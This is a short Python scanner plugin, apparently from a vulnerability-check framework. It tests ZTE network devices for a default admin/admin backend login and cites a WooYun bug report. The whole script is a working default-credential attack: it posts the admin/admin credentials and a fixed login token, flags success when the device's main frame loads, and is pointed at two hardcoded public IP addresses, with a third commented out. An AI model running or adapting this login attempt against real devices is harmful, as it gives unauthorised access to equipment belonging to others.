#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:中兴多台网络设备系统存在通用口令可登录后台。
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0112787
#Author:xq17
import re
import urlparse

def assign(service, arg):
    if service == 'zte':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    url = arg
    data = 'frashnum=&Frm_Logintoken=766893&Username=admin&Password=admin'
    code,head,res,errcode,urls =curl.curl2(url,post=data)

    if code==200 and 'ZTE' in head and 'mainFrame' in res:
        security_hole('default user:admin>>pass:admin>>'+arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zte','http://120.236.40.70/')[1])
    audit(assign('zte','http://120.236.40.76/')[1])
    # audit(assign('zte','http://120.236.40.72/')[1])